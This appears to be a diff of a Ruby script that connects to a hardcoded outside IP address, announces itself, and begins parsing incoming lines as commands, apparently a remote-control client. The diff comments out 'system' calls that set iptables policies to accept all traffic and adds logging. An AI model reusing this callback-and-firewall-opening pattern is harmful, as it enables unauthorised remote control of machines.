@@ -1,12 +1,18 @@
 require 'socket'
+require 'logger'
+
+logger = Logger.new('socket.log')
+logger.level = Logger::DEBUG
 
 #puts "Process #{Process.pid}"
 
-system "iptables -P INPUT ACCEPT"
-system "iptables -P OUTPUT ACCEPT"
-
+#system "iptables -P INPUT ACCEPT"
+#system "iptables -P OUTPUT ACCEPT"
+logger.debug("start")
 socket = TCPSocket.new('52.9.13.127', 2000)
+logger.debug("socket set")
 socket.puts("Hey!")
+logger.debug("said Hey!")
 
 def actions(line)
 	command = line.split
